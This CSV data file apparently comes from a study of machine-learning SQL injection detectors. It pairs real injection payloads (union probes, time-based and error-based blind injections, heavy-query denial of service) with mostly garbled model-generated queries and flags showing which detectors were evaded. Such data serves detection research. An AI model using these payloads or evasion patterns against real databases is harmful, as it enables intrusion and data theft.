original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1 where 2238=2238;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT'sequence' FROM SQL injection',1,0,1,1,1,1,1
"1"") as assu where 7521=7521 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","SELECT MIN(select count(*) FROM SQL injection detection WHERE sysusers as sys1,sysusers as sys2,sysusers as sys4,sysusers as sys7-- FROM sysusers AS sysusers AS sysusers as sys7-- SELECT MIN(select count(*) FROM SQL injection detection) FROM SELECT SELECT SELECT, COUNT(select_injection) FROM SELECT SELECT MIN(sysusers as sys1,sysusers as sys4, sysusers as sysusers as sys7) FROM SELECT SELECT MIN(select count(*) FROM SQL injection) AS sysusers as sysusers as sysusers as sys1, SELECT MIN(select count(*) FROM SQL SELECT SELECT",1,1,0,0,0,0,0
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3# sfup",1,1,0,1,0,0,0
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","SELECT MIN(sql injection) FROM SQL_injection WHERE 4450 = 4450 OR 6979 = like('abcdefg',upper(hex(randomblob(500000000000/2))",1,1,0,0,1,0,0
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""xccy""=""xccy","SELECT * FROM SQL injection, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM * * WHERE NOT elt(7982 = 7982,1) AND (SELECT elt(7982 = 7982,0x71706a71) FROM SQL SELECT MIN(select(select) FROM SELECT &(select ((select(select(select(select(select(select(select(sql injection) FROM SELECT * FROM SQL SELECT, XCY((select(select(select(select) FROM SQL Query: 1)",0,1,0,1,1,1,0
"-8966""))) or 1628=2712",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -8966) OR 1628 = 212,1,1,0,0,1,0,0
"1%"")));begin user_lock.sleep(5); end--",SELECT MIN(end_-) FROM SQL_injection WHERE NOT SELECT user_lock.sleep(5); end--,0,1,1,0,0,0,0
"1') as mgko where 1828=1828 and make_set(8403=8403,8899)--","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1') as mgko WHERE 1828 = 1828 AND make_set(8403 = 8403,8899)-- SELECT MIN(sql injection) FROM SQL injection",1,1,0,0,0,0,0
-8828)) as ospo where 2141=2141 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,SELECT MIN(case) FROM SQL injection_diagnosis WHERE 2141 = 2141 = 2141 OR 4493 = utl_inaddr.chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL_inaddr.get_host_address(chr(113) = '2141 = 2141 = 2141 = 2141 = 2141 = 2141 = 2141 = 2141 = 2141 = utl_inaddr.chr(113)|chr(113)|chr(113)|chr(113)|chr(113)|chr(113)|chr(113)|chr(113) FROM SELECT MIN(112)|chr(113) FROM ospo WHERE ospo = 'utl_inaddr.post_host_address(chr(113)|chr(113)|ch,0,1,0,0,0,0,0
(select (case when (9856=9856) then sleep(5) else 9856*(select 9856 from information_schema.character_sets) end)),"SELECT 9856 FROM SQL injection_description, COUNT(select) FROM query: (SELECT 9856 FROM information_schema.character_sets) FROM SQL injection)",0,1,0,0,1,0,0
"-3443"")) union all select 4043,4043,4043,4043,4043,4043,4043#",SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM Query: -3443),1,1,0,0,1,0,0
"1)) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((6829=6829",SELECT - (6829 = 6829) FROM SQL injection detection WHERE NOT ((6829 = 6829),1,1,1,0,0,0,0
"1""))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((""mmsh""=""mmsh","SELECT * FROM SQL injection_deficite, SELECT * FROM SQL_injection_ml(1808,concat(0x7171706a71,(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((select) FROM SQL injection)) ORDER BYSELECT SUM(liquid(0x7171706a71) FROM SELECT SELECT SUM(0x7171706a71) FROM SQL injection)) FROM SELECT SELECT SUM(1808,concat(0x7171706a71)) FROM SQL injection))",0,1,0,0,1,0,0
"1"") as ckoi where 4674=4674 union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM ckoi WHERE 4674 = 4674 = 4674,1,1,0,0,1,0,0
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT MIN(*) FROM SQL injection detection WHERE NOTsysibm.systables as t2,sysibm.systables as t3)-- SELECT MIN(select count(*) FROM sysibm.systables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,1,0,0
-3598) union all select 2264#,SELECT DISTINCT esq injection detection FROM SQL SELECT DISTINCT esq injection detection,1,0,1,1,1,1,1
"1'||(select 'zrea' from dual where 1223=1223 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT 'zrea' FROM SQL injection',1,0,1,1,1,1,1
"1%""))) and 7758=4792 and (((""%""=""",SELECT MIN((((((((((((((((((((((((((((((((((())) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
"1%"") rlike sleep(5) and (""%""=""",SELECT MIN(%) FROM SQL injection detection,1,0,0,1,1,1,0
-2783%')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',SELECT MIN(case) FROM SQL injection detection) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select)||chr(112)||chr(select_select) FROM SQL SELECT SELECT &(select) FROM SELECT SELECT &(select) FROM SQL SELECT &(select) FROM SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT SELECT MIN(select) FROM SQL SELECT &(select),0,0,0,0,1,0,0
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,SELECT DISTINCT case FROM SQL injection detection WHERE 6884 = 6884 AND 3715 = 6884 = 6884 AND NOT char(113) + chart(113) + chart(113) + chart(113) + chart(113) + chart(113) + chart(113) + chart(113) + chart(113) + chart(113) + chart (select) FROM SQL injection detection),0,1,0,0,1,0,0
"1%')) and elt(3114=3114,sleep(5))#",SELECT MIN(sleep(5))# FROM SQL injection_description,0,1,0,0,1,0,0
"1'||(select 'bzxa' where 6320=6320;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"1%""))) union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SELECT MIN(sql) FROM SQL SELECT MIN(sql) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT,1,1,1,0,1,1,0
-3750'+(select alpu where 3911=3911 order by 1--,SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT - FROM SQL - SELECT - FROM SQL - MIN(3911 = 3911 = 3911 ORDER BY - SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT -SELECT SQL injection FROM SQL Query: -3750'+(select alpu) FROM SELECT MIN(3911 = 3911 = 3911 FROM SELECT MIN(select alpu) FROM SQL SELECT -SELECT -SELECT -SELECT - FROM SQL - MIN(3911 = 3911 = 3911 = 3911 ORDER BY - LIMIT 1,1,1,0,1,0,0,0
"-3997'+(select 'avjk' where 1917=1917 union all select 1917,1917,1917--",SELECT -3997'+(select 'avjk') FROM SQL injection_detecting,1,1,1,0,1,1,0
1';(select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu,"SELECT DISTINCT select(sleep(5))) FROM SQL injection dept_inject SELECT DISTINCT ssrmq, 'yfvu' FROM SELECT SELECT DISTINCT ssl injection detection FROM SQL SELECT select(sleep(5)) FROM (SELECT srmq, 'yfvu') FROM (SELECT MIN(select(select(srmq) FROM (SELECT SUM(select(srmq) FROM'sq injection')",1,1,0,0,1,0,0
1');select case when 8975=2352 then 1 else null end--,SELECT MIN(1 AS _number) FROM SQL injection detection WHERE 8975 = 8975 = 272 AND NOT SELECT DISTINCT end-- end--,1,1,1,1,0,1,0
"1' where 5060=5060;select count(*) from generate_series(1,5000000)--",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe","SELECT * FROM SQL_injection, SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECTSQ_Procedures)) FROM SELECT SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM",1,0,0,1,1,1,0
1'||(select 'yhpe' where 8010=8010 rlike (select (case when (7910=3752) then 1 else 0x28 end)))||',"SELECT MIN(select) FROM SQL injection detection WHERE '8010 = 8010 = 8010 = 8010 rlike (select (select)|||''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''ssl injection','sql injection')",0,1,0,0,0,0,0
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dwcy""=""dwcy",SELECT * FROM SQL injection_deficite' ORDER BY * DESC LIMIT 1,1,0,1,1,1,1,1
"1"") where 8612=8612;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","SELECT MIN(*) FROM SQL injection detection WHERE NOT STRFT$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,1,0,0,0
"1"");select count(*) from generate_series(1,5000000)--","SELECT COUNT(*) FROM generate_series(1,5000000)-- SELECT MIN(1,5000000) FROM SQL injection detection",1,1,0,0,1,0,0
"1,(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",SELECT MIN(select) FROM SQL injection detection WHERE NOT SQL injection detection = 'evade',0,0,0,1,1,1,0
"1'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM SQL injection detection) FROM rdb$fields as T1 JOIN rdb$functions as T2 ON T1.rdb$collations = T2.rdb$functions as T3)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,1,0,0
"1"" where 4082=4082 and elt(5699=1432,1432)--","SELECT MIN(1432)-- SELECT MIN(sql injection) FROM SQL injection detection WHERE 4082 = 4082 AND NOT elt(5699 = 1432,1432)--",1,1,0,0,0,0,0
"1%')) union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"1' where 9602=9602;select benchmark(5000000,md5(0x4c4d6142))--","SELECT MIN(0x4c4d6142) FROM SQL injection AS t1 JOIN 9602 = 9602;select benchmark(5000000,md5(0x4c4d6142)-- SELECT MIN(sql injection) FROM SQL injection",0,1,0,0,1,0,0
"1))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((8018=8018","SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3) and((8018 = 8018) FROM SQL injection_description",1,1,0,0,0,0,0
"-5174'))) or make_set(9515=7938,7938) and ((('ygee'='ygee",SELECT MIN(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((()))) FROM SQL injection detection) FROM query query: -5174') ORDER BY query: -5174'),1,1,0,0,0,0,0
1%')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,SELECT MIN(case) FROM SQL injection detection) FROM SQL SELECT MIN(select) FROM SQL-INSERT SELECT MIN(case) FROM SQL-INSERT SELECT MIN(case) FROM dual-- end) FROM SQL-INSERT SELECT MIN(case) FROM SQL-INSERT SELECT MIN(case) FROM SQL-INSERT SELECT MIN(case) FROM query: 1%')),0,1,0,0,1,0,0
"1"")) as vgsb where 4747=4747;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dbxi"" like ""dbxi",SELECT dbxi FROM RESULT_INSTRUCTOR(65)||char(100) = 'dbxi' AND NOT dbxi_substring(repeat(sql) = 'evade',1,1,0,0,1,0,0
1' where 8537=8537 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,SELECT MIN(select) FROM SQL injection detection WHERE SELECT MIN(8537 = 8537) AND 3754 ='select upper(xmltype(chr(113)||chr(113)||chr(106)||chr(106)||chr(37)||chr(37)||chr(37)||chr(37)||chr(37)||chr(37) ='select',0,1,0,0,0,0,0
1)) order by 1--,"SELECT NOT SQL_inject_name, COUNT(*) FROM SQL_injector WHERE NOT SQL_inject_name = ""done"" ORDER BY 1--",1,1,1,0,1,1,0
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""dksc""=""dksc",SELECT DISTINCT case FROM SQL injection (SELECT SUM(SQL) FROM SQL)) AND NOT (SELECT SUM(SQL) FROM SQL),0,1,0,0,1,0,0
1%' rlike sleep(5)#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
-5774' where 3632=3632 or (3177=4222)*4222--,SELECT MIN(*4222_-) FROM SQL injection AS _evade_sq_injection_methods WHERE 3632 = 3632 = 3632 or (3177 = 4222)*4222--,1,1,0,0,0,0,0
"1))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM sysibm.systables as t2,sysibm.systables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,1,0,0
1);waitfor delay '0:0:5' and (4614=4614,SELECT MIN(category) FROM SQL injection detection WHERE NOT Query: 1,1,0,1,1,1,1,1
"-1277"") where 6622=6622 or 3038=3038",SELECT MIN(sql injection) FROM SQL SELECT MIN(6622 = 6622 = 6622 OR 3038 = 3038,1,1,0,0,0,0,0
"1')) as xuab where 4369=4369 union all select null,null,null--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)","SELECT NOT SQL_substring(repeat(right(5389),5000000000) FROMregexp_substring(repeat(right(right(right(right(right) or query: 1 or char(69)||char(85) = regexp_substring(repeat(right(right(5389),5000000000),null) FROM query: query: 1 or char(69)||char(85) = regexp_substring(repeat(right(right(right(right(right(5000000000) FROM SELECT SQL_substring(repeat(repeat(right(right(right(right) FROM query: Query: char(69)|char(5389) FROM query: SELECT MIN(repeat(right(right(right(right) FROM REGXP_substring(repeat(repeat(right(right) FROM query: char(5389) FROM query: char(59) FROM query: char(59)",1,1,0,0,1,0,0
"1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))#","SELECT MIN(sql injection) FROM SQL, SELECT 'abcdefg' FROM SQL SELECT MIN(sequence) FROM SQL_injection)",1,0,1,0,1,1,0
"1'+(select dyfw where 7743=7743 and 8407=(select count(*) from generate_series(1,5000000)))+'","SELECT DISTINCT dyfw FROM SQL_injection_description WHERE 7743 = 7743 AND 8407 = (select count(*) FROM generate_series(1,5000000)+')",0,1,0,0,0,0,0
-4308') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('jmot'='jmot,SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),SELECT MIN(7756 = 7756) FROM SQL injection detection,1,1,1,0,1,1,0
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""oiuw""=""oiuw","SELECT dbms_pipe.receive_message(chr(67)||chr(101), oiuw FROM SQL_injections WHERE NOT dbms_pipe.receive_message = ""dsq injection""",1,1,0,0,1,0,0
1)) as pjkd where 1105=1105 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT pjkd = 1105 = 1105 AND 4386 = utl_inaddr.chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113) FROM SQL_inaddr.get_host_address(select_inaddr.select_inaddr.chr(115) = 0,0,1,0,0,0,0,0
"-8783')) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM Query: -8783'),0,1,1,1,1,1,1
"1"" where 1166=1166;select pg_sleep(5)--","SELECT MIN(select) FROM SQL injection detection WHERE i_select pg_sleep(5)-- = ""1166 = 1166 = 1166 = 1166;select""",0,1,0,0,0,0,0
-8999'))) or 6872=6872 and ((('jare'='jare,SELECT DISTINCT (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((sql injection)) FROM SQL Query: -8999'))) FROM SELECT SELECT SELECT SELECT _jare) FROM 6872 = 6872)) FROM SQL injection)) FROM SELECT SELECT SELECT _jare) FROM 6872 = 6872)) FROM SQL injection))) FROM SQL injection))) FROM SELECT SELECT 'jare) FROM 6872 = 6872))) FROM SQL injection))) FROM SQL injection)) FROM SELECT SELECT - jare) FROM 6872 = 6872,1,1,0,0,1,0,0
1'));select (case when (2774=5503) then 2774 else 2774*(select 2774 from information_schema.character_sets) end)#,"SELECT * FROM SQL_injection_schema.character_sets) AS c1 FROM SQL_injection WHERE NOT * * = ""2774 = 5503)"" AND NOT * (select = 2774*** FROM information_schema.character_sets) end)#",1,1,0,0,0,0,0
"-4291"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""xyhi""=""xyhi","SELECT * FROM SQL injection_deficite,'sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql xr(5023 = ctxsys.drith(5023 ='sql injection'",1,0,1,0,0,0,0
-9054))) or 9323=9323#,SELECT 9323 = 9323 = 9323 = 9323 FROM SQL AS t1 JOIN query: -9054) ORDER BY query: 9323 = 9323,0,1,0,0,0,0,0
"1)) as myyh where 5116=5116 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",SELECT NOT chr(87)||chr(109) FROM query_message WHERE NOT SQL_injection = '5116' ORDER BY chr(87),1,1,0,0,1,0,0
"-9751""))) or 5929=3884--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT 5929 = 3884--,1,1,1,1,0,1,0
"1'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('wusq'='wusq","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = 't2, domain.tables as t3 and (((wusq)= 'wusq')",1,1,0,0,0,0,0
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('ootz' like 'ootz","SELECT COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((*) = 'ootz')",1,1,0,0,0,0,0
"1%"") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""","SELECT * FROM SQL_injection, SELECT * FROM *////select, elt(9067 = 9067,1) FROM information_schema.character_sets FROM SQL injection > ""sql injection detection"" AND (select (elt(9067 = 9067,1))",1,1,0,0,0,0,0
"1"" and 5205=9975#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- ivku","SELECT (SELECT 0x7171706a71,(select) FROM (SELECT 0x7171706a71,(select) FROM information_schema.character_sets FROM SQL query: 1 or (SELECT t1.select 9173 FROM(select) - ivku) FROM (SELECT t1.select, COUNT(select) FROM (SELECT t1.select, t1.select,'select','sql injection') ='sql') - ivku')) FROM(select) query: 1 or (select(select) - ivku)','select','select')' FROM (SELECT MIN(select) FROM(select) FROM information_schema.character_sets from(select) FROM information_schema.select Query: 1 or (select) FROM(select) FROM information_",0,1,0,0,1,0,0
"1"" and 9198=9198--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""gknn"" like ""gknn","SELECT MIN(select) FROM SQL injection, SELECT MIN(select) FROM Query: 1 ORDER BY elt(1297 = 1297,0x71706a71)",0,1,0,0,1,0,0
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (9112=9112","SELECT DISTINCT esq_injection FROM SQL SELECT DISTINCT esq_injection_description, COUNT(9112 = 9112 = 9112 = 9112 = 8384 = 'abcdefg'",1,1,0,0,0,0,0
-8812 or 6872=6872# dflr,SELECT MIN(sql) FROM Query: -8812 or 6872 = 6872# dflr = 'dflr',1,1,0,0,0,0,0
-4617'))) or 9323=9323#,SELECT MIN(9323 = 9323 = 9323 FROM SQL injection detection,1,1,0,0,1,0,0
"-4148%""))) or (8459=8459)*4906 and (((""%""=""",SELECT MIN((((((((((((((((((((((((((((((((((((((((())) FROM SQL injection)) FROM SQL injection detection),1,1,0,0,0,0,0
"1%' and 8407=(select count(*) from generate_series(1,5000000)) and '%'='","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(select count(*) FROM generate_series(1,5000000) AND '%' = '%'",1,1,0,0,1,0,0
"1"")) as jmoy where 9676=9676 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--","SELECT MIN(repeat(right(9981),5000000000) FROM SQL injection_detecting, SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(9676 = 9676 = 9676 = 9676)|char(9981) FROM SQL SELECT MIN(repeat(repeat(right(9981) FROM jmoy) FROM jmoy) FROM SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repe",1,1,0,0,1,0,0
"-9672%""))) order by 1#",SELECT MIN(1#) FROM SQL injection detection,1,1,1,0,1,1,0
"1"") where 6255=6255 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE NOT SQL_injection_type ='sql injection',0,0,0,0,1,0,0
"1') as jwvp where 5231=5231 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",SELECT MIN(select count(*) FROM SQL injection',1,1,1,0,1,1,0
1'+(select 'gprq' where 8928=8928;waitfor delay '0:0:5'--,SELECT MIN(select) FROM SQL injection detection WHERE 8928 = 8928 = 8928;waitfor delay '0:0:5'-- for',0,1,0,0,0,0,0
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))","SELECT * FROM (SELECT SUM(select) FROM SQL injection) AS :__executive_description, COUNT(select) FROM SQL_injection) AS t1 JOIN (SELECT t1.select, t1.select FROM (SELECT t1.select, t1.select, t1.select FROM (SELECT t1.select, t1.select, t1.select (select (select (select) AS t2*(select) FROM SQL JOIN Query: 1')) AS t2*(select) FROM (SELECT SUM(select) FROM SQL JOIN Query: 1') AS t2 ON t1.select = t2.select WHERE NOT t1.select ='sql injection')) AS t3 ON t2.select = t3.select WHERE t2.select ='sql injection')",0,1,0,0,1,0,0
"-4929"" where 6381=6381 or 8571=8571--","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -4929 WHERE 6381 = 6381 = 6381 OR 8571 = 8571 - ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------SQLEX_DISEASED_TABLE()()','sql injection' FROM SQL SELECT SELECT MIN(8571 = 8571 = 5871 = 6381 = 6381 = 6371 = 8571 = 8571",1,1,0,0,0,0,0
"1"") as aifd where 5962=5962;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",SELECT MIN(select) FROM SQL injection AS t1 JOIN 5962 = 5962;select (case when (4666 = 4666) FROM master..sysdatabases) end) AS _end__select AS t2 ON t1.select = t2.select WHERE t2.5966 = 5962;select (case when (4666 = 4666) AND NOT t2.select ='sql injection',0,1,0,0,0,0,0
